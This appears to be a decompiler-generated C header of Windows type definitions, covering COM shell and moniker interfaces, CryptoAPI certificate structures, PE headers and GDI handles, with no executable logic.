typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct IShellFolder IShellFolder, *PIShellFolder;

typedef struct IShellFolderVtbl IShellFolderVtbl, *PIShellFolderVtbl;

typedef long HRESULT;


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef GUID IID;

typedef ulong DWORD;

typedef DWORD ULONG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef struct IBindCtx IBindCtx, *PIBindCtx;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef struct _ITEMIDLIST _ITEMIDLIST, *P_ITEMIDLIST;

typedef struct _ITEMIDLIST ITEMIDLIST;

typedef ITEMIDLIST *LPITEMIDLIST;

typedef DWORD SHCONTF;

typedef struct IEnumIDList IEnumIDList, *PIEnumIDList;

typedef ITEMIDLIST *LPCITEMIDLIST;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef uint UINT;

typedef ULONG SFGAOF;

typedef DWORD SHGDNF;

typedef struct _STRRET _STRRET, *P_STRRET;

typedef struct _STRRET STRRET;

typedef WCHAR *LPCWSTR;

typedef struct IBindCtxVtbl IBindCtxVtbl, *PIBindCtxVtbl;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct tagBIND_OPTS tagBIND_OPTS, *PtagBIND_OPTS;

typedef struct tagBIND_OPTS BIND_OPTS;

typedef struct IRunningObjectTable IRunningObjectTable, *PIRunningObjectTable;

typedef WCHAR OLECHAR;

typedef OLECHAR *LPOLESTR;

typedef struct IEnumString IEnumString, *PIEnumString;

typedef struct _SHITEMID _SHITEMID, *P_SHITEMID;

typedef struct _SHITEMID SHITEMID;

typedef struct IEnumIDListVtbl IEnumIDListVtbl, *PIEnumIDListVtbl;

typedef union _union_3888 _union_3888, *P_union_3888;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IRunningObjectTableVtbl IRunningObjectTableVtbl, *PIRunningObjectTableVtbl;

typedef struct IMoniker IMoniker, *PIMoniker;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef struct IEnumMoniker IEnumMoniker, *PIEnumMoniker;

typedef struct IEnumStringVtbl IEnumStringVtbl, *PIEnumStringVtbl;

typedef ushort USHORT;

typedef uchar BYTE;

typedef struct IMonikerVtbl IMonikerVtbl, *PIMonikerVtbl;

typedef GUID CLSID;

typedef struct IStream IStream, *PIStream;

typedef int BOOL;

typedef union _ULARGE_INTEGER _ULARGE_INTEGER, *P_ULARGE_INTEGER;

typedef union _ULARGE_INTEGER ULARGE_INTEGER;

typedef struct IEnumMonikerVtbl IEnumMonikerVtbl, *PIEnumMonikerVtbl;

typedef struct IStreamVtbl IStreamVtbl, *PIStreamVtbl;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct tagSTATSTG tagSTATSTG, *PtagSTATSTG;

typedef struct tagSTATSTG STATSTG;

typedef struct _struct_22 _struct_22, *P_struct_22;

typedef struct _struct_23 _struct_23, *P_struct_23;

typedef double ULONGLONG;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

typedef long LONG;

struct IStreamVtbl {
    HRESULT (*QueryInterface)(struct IStream *, IID *, void **);
    ULONG (*AddRef)(struct IStream *);
    ULONG (*Release)(struct IStream *);
    HRESULT (*Read)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Write)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Seek)(struct IStream *, LARGE_INTEGER, DWORD, ULARGE_INTEGER *);
    HRESULT (*SetSize)(struct IStream *, ULARGE_INTEGER);
    HRESULT (*CopyTo)(struct IStream *, struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER *, ULARGE_INTEGER *);
    HRESULT (*Commit)(struct IStream *, DWORD);
    HRESULT (*Revert)(struct IStream *);
    HRESULT (*LockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*UnlockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*Stat)(struct IStream *, STATSTG *, DWORD);
    HRESULT (*Clone)(struct IStream *, struct IStream **);
};

struct _SHITEMID {
    USHORT cb;
    BYTE abID[1];
};

struct _ITEMIDLIST {
    SHITEMID mkid;
};

struct IEnumStringVtbl {
    HRESULT (*QueryInterface)(struct IEnumString *, IID *, void **);
    ULONG (*AddRef)(struct IEnumString *);
    ULONG (*Release)(struct IEnumString *);
    HRESULT (*Next)(struct IEnumString *, ULONG, LPOLESTR *, ULONG *);
    HRESULT (*Skip)(struct IEnumString *, ULONG);
    HRESULT (*Reset)(struct IEnumString *);
    HRESULT (*Clone)(struct IEnumString *, struct IEnumString **);
};

struct IStream {
    struct IStreamVtbl *lpVtbl;
};

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

struct IEnumIDList {
    struct IEnumIDListVtbl *lpVtbl;
};

struct IMoniker {
    struct IMonikerVtbl *lpVtbl;
};

struct IEnumString {
    struct IEnumStringVtbl *lpVtbl;
};

struct IEnumIDListVtbl {
    HRESULT (*QueryInterface)(struct IEnumIDList *, IID *, void **);
    ULONG (*AddRef)(struct IEnumIDList *);
    ULONG (*Release)(struct IEnumIDList *);
    HRESULT (*Next)(struct IEnumIDList *, ULONG, LPITEMIDLIST *, ULONG *);
    HRESULT (*Skip)(struct IEnumIDList *, ULONG);
    HRESULT (*Reset)(struct IEnumIDList *);
    HRESULT (*Clone)(struct IEnumIDList *, struct IEnumIDList **);
};

struct IEnumMonikerVtbl {
    HRESULT (*QueryInterface)(struct IEnumMoniker *, IID *, void **);
    ULONG (*AddRef)(struct IEnumMoniker *);
    ULONG (*Release)(struct IEnumMoniker *);
    HRESULT (*Next)(struct IEnumMoniker *, ULONG, struct IMoniker **, ULONG *);
    HRESULT (*Skip)(struct IEnumMoniker *, ULONG);
    HRESULT (*Reset)(struct IEnumMoniker *);
    HRESULT (*Clone)(struct IEnumMoniker *, struct IEnumMoniker **);
};

struct tagBIND_OPTS {
    DWORD cbStruct;
    DWORD grfFlags;
    DWORD grfMode;
    DWORD dwTickCountDeadline;
};

struct _struct_22 {
    DWORD LowPart;
    DWORD HighPart;
};

struct _struct_23 {
    DWORD LowPart;
    DWORD HighPart;
};

union _ULARGE_INTEGER {
    struct _struct_22 s;
    struct _struct_23 u;
    ULONGLONG QuadPart;
};

struct IBindCtx {
    struct IBindCtxVtbl *lpVtbl;
};

struct IBindCtxVtbl {
    HRESULT (*QueryInterface)(struct IBindCtx *, IID *, void **);
    ULONG (*AddRef)(struct IBindCtx *);
    ULONG (*Release)(struct IBindCtx *);
    HRESULT (*RegisterObjectBound)(struct IBindCtx *, struct IUnknown *);
    HRESULT (*RevokeObjectBound)(struct IBindCtx *, struct IUnknown *);
    HRESULT (*ReleaseBoundObjects)(struct IBindCtx *);
    HRESULT (*SetBindOptions)(struct IBindCtx *, BIND_OPTS *);
    HRESULT (*GetBindOptions)(struct IBindCtx *, BIND_OPTS *);
    HRESULT (*GetRunningObjectTable)(struct IBindCtx *, struct IRunningObjectTable **);
    HRESULT (*RegisterObjectParam)(struct IBindCtx *, LPOLESTR, struct IUnknown *);
    HRESULT (*GetObjectParam)(struct IBindCtx *, LPOLESTR, struct IUnknown **);
    HRESULT (*EnumObjectParam)(struct IBindCtx *, struct IEnumString **);
    HRESULT (*RevokeObjectParam)(struct IBindCtx *, LPOLESTR);
};

struct IRunningObjectTableVtbl {
    HRESULT (*QueryInterface)(struct IRunningObjectTable *, IID *, void **);
    ULONG (*AddRef)(struct IRunningObjectTable *);
    ULONG (*Release)(struct IRunningObjectTable *);
    HRESULT (*Register)(struct IRunningObjectTable *, DWORD, struct IUnknown *, struct IMoniker *, DWORD *);
    HRESULT (*Revoke)(struct IRunningObjectTable *, DWORD);
    HRESULT (*IsRunning)(struct IRunningObjectTable *, struct IMoniker *);
    HRESULT (*GetObjectA)(struct IRunningObjectTable *, struct IMoniker *, struct IUnknown **);
    HRESULT (*NoteChangeTime)(struct IRunningObjectTable *, DWORD, FILETIME *);
    HRESULT (*GetTimeOfLastChange)(struct IRunningObjectTable *, struct IMoniker *, FILETIME *);
    HRESULT (*EnumRunning)(struct IRunningObjectTable *, struct IEnumMoniker **);
};

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct tagSTATSTG {
    LPOLESTR pwcsName;
    DWORD type;
    ULARGE_INTEGER cbSize;
    FILETIME mtime;
    FILETIME ctime;
    FILETIME atime;
    DWORD grfMode;
    DWORD grfLocksSupported;
    CLSID clsid;
    DWORD grfStateBits;
    DWORD reserved;
};

struct IMonikerVtbl {
    HRESULT (*QueryInterface)(struct IMoniker *, IID *, void **);
    ULONG (*AddRef)(struct IMoniker *);
    ULONG (*Release)(struct IMoniker *);
    HRESULT (*GetClassID)(struct IMoniker *, CLSID *);
    HRESULT (*IsDirty)(struct IMoniker *);
    HRESULT (*Load)(struct IMoniker *, struct IStream *);
    HRESULT (*Save)(struct IMoniker *, struct IStream *, BOOL);
    HRESULT (*GetSizeMax)(struct IMoniker *, ULARGE_INTEGER *);
    HRESULT (*BindToObject)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, IID *, void **);
    HRESULT (*BindToStorage)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, IID *, void **);
    HRESULT (*Reduce)(struct IMoniker *, struct IBindCtx *, DWORD, struct IMoniker **, struct IMoniker **);
    HRESULT (*ComposeWith)(struct IMoniker *, struct IMoniker *, BOOL, struct IMoniker **);
    HRESULT (*Enum)(struct IMoniker *, BOOL, struct IEnumMoniker **);
    HRESULT (*IsEqual)(struct IMoniker *, struct IMoniker *);
    HRESULT (*Hash)(struct IMoniker *, DWORD *);
    HRESULT (*IsRunning)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, struct IMoniker *);
    HRESULT (*GetTimeOfLastChange)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, FILETIME *);
    HRESULT (*Inverse)(struct IMoniker *, struct IMoniker **);
    HRESULT (*CommonPrefixWith)(struct IMoniker *, struct IMoniker *, struct IMoniker **);
    HRESULT (*RelativePathTo)(struct IMoniker *, struct IMoniker *, struct IMoniker **);
    HRESULT (*GetDisplayName)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, LPOLESTR *);
    HRESULT (*ParseDisplayName)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, LPOLESTR, ULONG *, struct IMoniker **);
    HRESULT (*IsSystemMoniker)(struct IMoniker *, DWORD *);
};

struct HWND__ {
    int unused;
};

struct IShellFolder {
    struct IShellFolderVtbl *lpVtbl;
};

struct IShellFolderVtbl {
    HRESULT (*QueryInterface)(struct IShellFolder *, IID *, void **);
    ULONG (*AddRef)(struct IShellFolder *);
    ULONG (*Release)(struct IShellFolder *);
    HRESULT (*ParseDisplayName)(struct IShellFolder *, HWND, struct IBindCtx *, LPWSTR, ULONG *, LPITEMIDLIST *, ULONG *);
    HRESULT (*EnumObjects)(struct IShellFolder *, HWND, SHCONTF, struct IEnumIDList **);
    HRESULT (*BindToObject)(struct IShellFolder *, LPCITEMIDLIST, struct IBindCtx *, IID *, void **);
    HRESULT (*BindToStorage)(struct IShellFolder *, LPCITEMIDLIST, struct IBindCtx *, IID *, void **);
    HRESULT (*CompareIDs)(struct IShellFolder *, LPARAM, LPCITEMIDLIST, LPCITEMIDLIST);
    HRESULT (*CreateViewObject)(struct IShellFolder *, HWND, IID *, void **);
    HRESULT (*GetAttributesOf)(struct IShellFolder *, UINT, LPCITEMIDLIST *, SFGAOF *);
    HRESULT (*GetUIObjectOf)(struct IShellFolder *, HWND, UINT, LPCITEMIDLIST *, IID *, UINT *, void **);
    HRESULT (*GetDisplayNameOf)(struct IShellFolder *, LPCITEMIDLIST, SHGDNF, STRRET *);
    HRESULT (*SetNameOf)(struct IShellFolder *, HWND, LPCITEMIDLIST, LPCWSTR, SHGDNF, LPITEMIDLIST *);
};

struct IRunningObjectTable {
    struct IRunningObjectTableVtbl *lpVtbl;
};

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

union _union_3888 {
    LPWSTR pOleStr;
    UINT uOffset;
    char cStr[260];
};

struct _STRRET {
    UINT uType;
    union _union_3888 u;
};

struct IEnumMoniker {
    struct IEnumMonikerVtbl *lpVtbl;
};

typedef int INT_PTR;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

typedef char CHAR;

typedef CHAR *LPSTR;

typedef BOOL (*TIMEFMT_ENUMPROCA)(LPSTR);

typedef struct _numberfmtA _numberfmtA, *P_numberfmtA;

typedef struct _numberfmtA NUMBERFMTA;

struct _numberfmtA {
    UINT NumDigits;
    UINT LeadingZero;
    UINT Grouping;
    LPSTR lpDecimalSep;
    LPSTR lpThousandSep;
    UINT NegativeOrder;
};

typedef DWORD LCTYPE;

typedef DWORD CALID;

typedef DWORD CALTYPE;

typedef struct _ABC _ABC, *P_ABC;

struct _ABC {
    int abcA;
    UINT abcB;
    int abcC;
};

typedef struct _FIXED _FIXED, *P_FIXED;

typedef struct _FIXED FIXED;

typedef ushort WORD;

struct _FIXED {
    WORD fract;
    short value;
};

typedef struct _devicemodeA _devicemodeA, *P_devicemodeA;

typedef struct _devicemodeA DEVMODEA;

typedef union _union_655 _union_655, *P_union_655;

typedef union _union_658 _union_658, *P_union_658;

typedef struct _struct_656 _struct_656, *P_struct_656;

typedef struct _struct_657 _struct_657, *P_struct_657;

typedef struct _POINTL _POINTL, *P_POINTL;

typedef struct _POINTL POINTL;

struct _struct_656 {
    short dmOrientation;
    short dmPaperSize;
    short dmPaperLength;
    short dmPaperWidth;
    short dmScale;
    short dmCopies;
    short dmDefaultSource;
    short dmPrintQuality;
};

struct _POINTL {
    LONG x;
    LONG y;
};

struct _struct_657 {
    POINTL dmPosition;
    DWORD dmDisplayOrientation;
    DWORD dmDisplayFixedOutput;
};

union _union_655 {
    struct _struct_656 field0;
    struct _struct_657 field1;
};

union _union_658 {
    DWORD dmDisplayFlags;
    DWORD dmNup;
};

struct _devicemodeA {
    BYTE dmDeviceName[32];
    WORD dmSpecVersion;
    WORD dmDriverVersion;
    WORD dmSize;
    WORD dmDriverExtra;
    DWORD dmFields;
    union _union_655 field6_0x2c;
    short dmColor;
    short dmDuplex;
    short dmYResolution;
    short dmTTOption;
    short dmCollate;
    BYTE dmFormName[32];
    WORD dmLogPixels;
    DWORD dmBitsPerPel;
    DWORD dmPelsWidth;
    DWORD dmPelsHeight;
    union _union_658 field17_0x74;
    DWORD dmDisplayFrequency;
    DWORD dmICMMethod;
    DWORD dmICMIntent;
    DWORD dmMediaType;
    DWORD dmDitherType;
    DWORD dmReserved1;
    DWORD dmReserved2;
    DWORD dmPanningWidth;
    DWORD dmPanningHeight;
};

typedef struct _ABC *LPABC;

typedef struct _GLYPHMETRICS _GLYPHMETRICS, *P_GLYPHMETRICS;

typedef struct _GLYPHMETRICS *LPGLYPHMETRICS;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct _GLYPHMETRICS {
    UINT gmBlackBoxX;
    UINT gmBlackBoxY;
    POINT gmptGlyphOrigin;
    short gmCellIncX;
    short gmCellIncY;
};

typedef struct _MAT2 _MAT2, *P_MAT2;

struct _MAT2 {
    FIXED eM11;
    FIXED eM12;
    FIXED eM21;
    FIXED eM22;
};

typedef struct _MAT2 MAT2;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef GUID *LPGUID;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef CHAR *LPCSTR;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef WCHAR *PWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct _CRYPTOAPI_BLOB _CRYPTOAPI_BLOB, *P_CRYPTOAPI_BLOB;

typedef struct _CRYPTOAPI_BLOB CRYPT_OBJID_BLOB;

struct _CRYPTOAPI_BLOB {
    DWORD cbData;
    BYTE *pbData;
};

typedef struct _CRYPTOAPI_BLOB CRYPT_INTEGER_BLOB;

typedef struct _CTL_CONTEXT _CTL_CONTEXT, *P_CTL_CONTEXT;

typedef struct _CTL_CONTEXT CTL_CONTEXT;

typedef struct _CTL_INFO _CTL_INFO, *P_CTL_INFO;

typedef struct _CTL_INFO *PCTL_INFO;

typedef void *HCERTSTORE;

typedef void *HCRYPTMSG;

typedef struct _CTL_USAGE _CTL_USAGE, *P_CTL_USAGE;

typedef struct _CTL_USAGE CTL_USAGE;

typedef struct _CRYPTOAPI_BLOB CRYPT_DATA_BLOB;

typedef struct _CRYPT_ALGORITHM_IDENTIFIER _CRYPT_ALGORITHM_IDENTIFIER, *P_CRYPT_ALGORITHM_IDENTIFIER;

typedef struct _CRYPT_ALGORITHM_IDENTIFIER CRYPT_ALGORITHM_IDENTIFIER;

typedef struct _CTL_ENTRY _CTL_ENTRY, *P_CTL_ENTRY;

typedef struct _CTL_ENTRY *PCTL_ENTRY;

typedef struct _CERT_EXTENSION _CERT_EXTENSION, *P_CERT_EXTENSION;

typedef struct _CERT_EXTENSION *PCERT_EXTENSION;

typedef struct _CRYPT_ATTRIBUTE _CRYPT_ATTRIBUTE, *P_CRYPT_ATTRIBUTE;

typedef struct _CRYPT_ATTRIBUTE *PCRYPT_ATTRIBUTE;

typedef struct _CRYPTOAPI_BLOB *PCRYPT_ATTR_BLOB;

struct _CTL_CONTEXT {
    DWORD dwMsgAndCertEncodingType;
    BYTE *pbCtlEncoded;
    DWORD cbCtlEncoded;
    PCTL_INFO pCtlInfo;
    HCERTSTORE hCertStore;
    HCRYPTMSG hCryptMsg;
    BYTE *pbCtlContent;
    DWORD cbCtlContent;
};

struct _CRYPT_ATTRIBUTE {
    LPSTR pszObjId;
    DWORD cValue;
    PCRYPT_ATTR_BLOB rgValue;
};

struct _CRYPT_ALGORITHM_IDENTIFIER {
    LPSTR pszObjId;
    CRYPT_OBJID_BLOB Parameters;
};

struct _CTL_USAGE {
    DWORD cUsageIdentifier;
    LPSTR *rgpszUsageIdentifier;
};

struct _CERT_EXTENSION {
    LPSTR pszObjId;
    BOOL fCritical;
    CRYPT_OBJID_BLOB Value;
};

struct _CTL_ENTRY {
    CRYPT_DATA_BLOB SubjectIdentifier;
    DWORD cAttribute;
    PCRYPT_ATTRIBUTE rgAttribute;
};

struct _CTL_INFO {
    DWORD dwVersion;
    CTL_USAGE SubjectUsage;
    CRYPT_DATA_BLOB ListIdentifier;
    CRYPT_INTEGER_BLOB SequenceNumber;
    FILETIME ThisUpdate;
    FILETIME NextUpdate;
    CRYPT_ALGORITHM_IDENTIFIER SubjectAlgorithm;
    DWORD cCTLEntry;
    PCTL_ENTRY rgCTLEntry;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

typedef struct _CRL_ENTRY _CRL_ENTRY, *P_CRL_ENTRY;

struct _CRL_ENTRY {
    CRYPT_INTEGER_BLOB SerialNumber;
    FILETIME RevocationDate;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

typedef struct _CRL_CONTEXT _CRL_CONTEXT, *P_CRL_CONTEXT;

typedef struct _CRL_CONTEXT CRL_CONTEXT;

typedef CRL_CONTEXT *PCCRL_CONTEXT;

typedef struct _CRL_INFO _CRL_INFO, *P_CRL_INFO;

typedef struct _CRL_INFO *PCRL_INFO;

typedef struct _CRYPTOAPI_BLOB CERT_NAME_BLOB;

typedef struct _CRL_ENTRY *PCRL_ENTRY;

struct _CRL_INFO {
    DWORD dwVersion;
    CRYPT_ALGORITHM_IDENTIFIER SignatureAlgorithm;
    CERT_NAME_BLOB Issuer;
    FILETIME ThisUpdate;
    FILETIME NextUpdate;
    DWORD cCRLEntry;
    PCRL_ENTRY rgCRLEntry;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

struct _CRL_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCrlEncoded;
    DWORD cbCrlEncoded;
    PCRL_INFO pCrlInfo;
    HCERTSTORE hCertStore;
};

typedef struct _CRYPT_BIT_BLOB _CRYPT_BIT_BLOB, *P_CRYPT_BIT_BLOB;

struct _CRYPT_BIT_BLOB {
    DWORD cbData;
    BYTE *pbData;
    DWORD cUnusedBits;
};

typedef struct _CERT_PUBLIC_KEY_INFO _CERT_PUBLIC_KEY_INFO, *P_CERT_PUBLIC_KEY_INFO;

typedef struct _CERT_PUBLIC_KEY_INFO CERT_PUBLIC_KEY_INFO;

typedef struct _CRYPT_BIT_BLOB CRYPT_BIT_BLOB;

struct _CERT_PUBLIC_KEY_INFO {
    CRYPT_ALGORITHM_IDENTIFIER Algorithm;
    CRYPT_BIT_BLOB PublicKey;
};

typedef struct _CERT_CONTEXT _CERT_CONTEXT, *P_CERT_CONTEXT;

typedef struct _CERT_CONTEXT CERT_CONTEXT;

typedef struct _CERT_INFO _CERT_INFO, *P_CERT_INFO;

typedef struct _CERT_INFO *PCERT_INFO;

struct _CERT_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCertEncoded;
    DWORD cbCertEncoded;
    PCERT_INFO pCertInfo;
    HCERTSTORE hCertStore;
};

struct _CERT_INFO {
    DWORD dwVersion;
    CRYPT_INTEGER_BLOB SerialNumber;
    CRYPT_ALGORITHM_IDENTIFIER SignatureAlgorithm;
    CERT_NAME_BLOB Issuer;
    FILETIME NotBefore;
    FILETIME NotAfter;
    CERT_NAME_BLOB Subject;
    CERT_PUBLIC_KEY_INFO SubjectPublicKeyInfo;
    CRYPT_BIT_BLOB IssuerUniqueId;
    CRYPT_BIT_BLOB SubjectUniqueId;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

typedef struct _CRYPT_DECRYPT_MESSAGE_PARA _CRYPT_DECRYPT_MESSAGE_PARA, *P_CRYPT_DECRYPT_MESSAGE_PARA;

typedef struct _CRYPT_DECRYPT_MESSAGE_PARA *PCRYPT_DECRYPT_MESSAGE_PARA;

struct _CRYPT_DECRYPT_MESSAGE_PARA {
    DWORD cbSize;
    DWORD dwMsgAndCertEncodingType;
    DWORD cCertStore;
    HCERTSTORE *rghCertStore;
};

typedef CERT_CONTEXT *PCCERT_CONTEXT;

typedef PCCERT_CONTEXT (*PFN_CRYPT_GET_SIGNER_CERTIFICATE)(void *, DWORD, PCERT_INFO, HCERTSTORE);

typedef struct _CRYPT_VERIFY_MESSAGE_PARA _CRYPT_VERIFY_MESSAGE_PARA, *P_CRYPT_VERIFY_MESSAGE_PARA;

typedef struct _CRYPT_VERIFY_MESSAGE_PARA *PCRYPT_VERIFY_MESSAGE_PARA;

typedef ulong ULONG_PTR;

typedef ULONG_PTR HCRYPTPROV_LEGACY;

struct _CRYPT_VERIFY_MESSAGE_PARA {
    DWORD cbSize;
    DWORD dwMsgAndCertEncodingType;
    HCRYPTPROV_LEGACY hCryptProv;
    PFN_CRYPT_GET_SIGNER_CERTIFICATE pfnGetSignerCertificate;
    void *pvGetArg;
};

typedef struct _CRYPTOAPI_BLOB *PCERT_NAME_BLOB;

typedef CTL_CONTEXT *PCCTL_CONTEXT;

typedef struct _CTL_USAGE *PCERT_ENHKEY_USAGE;

typedef ULONG_PTR SIZE_T;

typedef struct tagBLOB tagBLOB, *PtagBLOB;

typedef struct tagBLOB BLOB;

struct tagBLOB {
    ULONG cbSize;
    BYTE *pBlobData;
};

typedef struct _SERVICE_ADDRESSES _SERVICE_ADDRESSES, *P_SERVICE_ADDRESSES;

typedef struct _SERVICE_ADDRESS _SERVICE_ADDRESS, *P_SERVICE_ADDRESS;

typedef struct _SERVICE_ADDRESS SERVICE_ADDRESS;

struct _SERVICE_ADDRESS {
    DWORD dwAddressType;
    DWORD dwAddressFlags;
    DWORD dwAddressLength;
    DWORD dwPrincipalLength;
    BYTE *lpAddress;
    BYTE *lpPrincipal;
};

struct _SERVICE_ADDRESSES {
    DWORD dwAddressCount;
    SERVICE_ADDRESS Addresses[1];
};

typedef struct _SERVICE_ADDRESSES *LPSERVICE_ADDRESSES;

typedef void (*LPSERVICE_CALLBACK_PROC)(LPARAM, HANDLE);

typedef struct _SERVICE_ASYNC_INFO _SERVICE_ASYNC_INFO, *P_SERVICE_ASYNC_INFO;

struct _SERVICE_ASYNC_INFO {
    LPSERVICE_CALLBACK_PROC lpServiceCallbackProc;
    LPARAM lParam;
    HANDLE hAsyncTaskHandle;
};

typedef struct _SERVICE_INFOW _SERVICE_INFOW, *P_SERVICE_INFOW;

struct _SERVICE_INFOW {
    LPGUID lpServiceType;
    LPWSTR lpServiceName;
    LPWSTR lpComment;
    LPWSTR lpLocale;
    DWORD dwDisplayHint;
    DWORD dwVersion;
    DWORD dwTime;
    LPWSTR lpMachineName;
    LPSERVICE_ADDRESSES lpServiceAddress;
    BLOB ServiceSpecificInfo;
};

typedef struct _SERVICE_ASYNC_INFO *LPSERVICE_ASYNC_INFO;

typedef struct _SERVICE_INFOW *LPSERVICE_INFOW;

typedef struct tagPOINT *LPPOINT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HRGN__ HRGN__, *PHRGN__;

struct HRGN__ {
    int unused;
};

typedef struct HDC__ HDC__, *PHDC__;

struct HDC__ {
    int unused;
};

typedef int *LPINT;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

struct HBRUSH__ {
    int unused;
};

